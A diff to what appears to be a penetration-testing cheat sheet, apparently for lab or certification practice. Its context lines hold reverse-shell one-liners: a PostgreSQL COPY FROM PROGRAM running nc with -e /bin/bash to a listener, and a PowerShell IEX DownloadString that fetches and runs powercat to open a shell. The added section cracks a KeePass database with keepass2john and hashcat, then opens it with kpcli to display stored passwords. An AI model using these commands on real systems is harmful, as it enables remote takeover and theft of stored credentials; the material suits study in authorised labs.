@@ -363,3 +363,13 @@ ex) COPY cmd_exec FROM PROGRAM 'nc 192.168.45.176 4444 -e /bin/bash'
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
 
 ```
+
+## kdbx and KPCLI
+```bash
+keepass2john Database.kdbx > keepass.hash
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force 
+
+sudo apt install kpcli
+kpcli --kdb=Database.kdbx
+show -f 2
+```
